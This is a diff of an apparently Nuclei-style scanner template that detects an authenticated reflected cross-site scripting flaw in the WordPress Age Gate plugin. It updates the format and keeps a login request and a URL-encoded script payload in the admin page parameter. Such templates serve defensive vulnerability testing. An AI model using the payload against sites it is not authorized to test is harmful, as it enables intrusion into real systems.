@@ -13,9 +13,11 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-  tags: xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp
+  metadata:
+    max-request: 2
+  tags: xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp,vuln
 
-requests:
+http:
   - raw:
       - |
         POST /wp-login.php HTTP/1.1
@@ -23,12 +25,10 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
-
       - |
         GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
 
-    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -46,5 +46,4 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/09/28
+# digest: 4a0a0047304502203a6bded4fb36e39e66d1c225af70d6e6094619d8f96c3aee6e3eccc73b755ddc022100be4bb1849313f342928f5afd03ef68a34d21a7b6d89a23d4561943437db30c84:922c64590222798bb761d5b6d8e72950
